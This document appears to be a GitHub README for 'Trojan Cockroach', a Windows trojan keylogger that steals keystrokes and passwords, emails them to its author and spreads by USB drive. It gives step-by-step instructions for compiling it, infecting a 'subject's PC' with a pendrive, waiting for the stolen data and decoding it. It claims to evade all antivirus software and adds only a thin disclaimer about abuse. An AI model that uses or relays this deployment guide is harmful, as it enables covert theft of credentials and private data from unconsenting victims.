# :smiling_imp: Trojan Cockroach

#### An Undetectable Trojan Spyware

<a href="https://MinhasKamal.github.io/TrojanCockroach">This program</a> is a **Trojan Virus** that steals data (ID, password; every key stroke) from PC (Windows XP or later) and emails it back to the author. It spreads among PCs through USB drives. It is undetectable by any antivirus software.

### Setup
1. Preparation
  1. Change **getRandomName()** and **sendData()** method of **TrojanCockroach.cpp** according to your wish.
  2. Compile **TrojanCockroach.cpp** & **Infect.cpp** (do not rename them).
  3. Place **TrojanCockroach.exe**, **Infect.exe**, **---**, **---** & **---** in the same folder.
  4. Now run **TrojanCockroach.exe**.
  5. Then insert a pendrive in your PC (see the magic!).
  
Here, I have changed all the file names (you do not wish to keep these- 'TrojanCockroach', 'Infect'; right? the code will need to be changed a little too) and this is how they look-

<div align="center">
  <img src="https://cloud.githubusercontent.com/assets/5456665/18255358/cbaf8484-73ca-11e6-99a0-a5a52f65f8a0.PNG" alt="Key-Logger"/>
</div>

2. Attack
  1. Now, insert the USB-Drive in the subject's PC (Yes, you have to start the spreading process from somewhere!)
  2. Run the shortcut and the spyware will be injected. Now (after a restart) everytime any USB-Drive is inserted in the affected PC, the virus will copy itself in that, and the circle will start again!

3. Data Collection
  1. You need to wait several days (depending on the number of power on/off of the PC), before getting any data.
  2. After getting the email copy the full message to a text file. As the the message has come through email certain characters are converted. To resolve that --- --- ---.
  3. Now, run **DecodeMessage.exe** for decoding the message as plain text. In this phase, you can look for specific patterns in the text, and thus get rid of most of the useless parts (like- mouse click, or same key-group press as happens during gaming).

You can get a more clear understanding of the project from its pre-project- **[KeyLogger](https://github.com/MinhasKamal/KeyLogger)**.

**Note:** I do not want newbies to abuse my project, so I am **not revealing all the secrets**. I also have made some nonsense changes in the code, so that no one can run it effectively without getting his hands dirty.

I will not also take any responsibility of someone else's ill act with my program. But I do believe that a real learner will learn a lot from this.


### License
<a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-nd/4.0/88x31.png" /></a><br /><a href="https://github.com/MinhasKamal/TrojanCockroach">Trojan Cockroach</a> is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/4.0/">Creative Commons Attribution-NonCommercial-NoDerivatives 4.0 International License</a>.
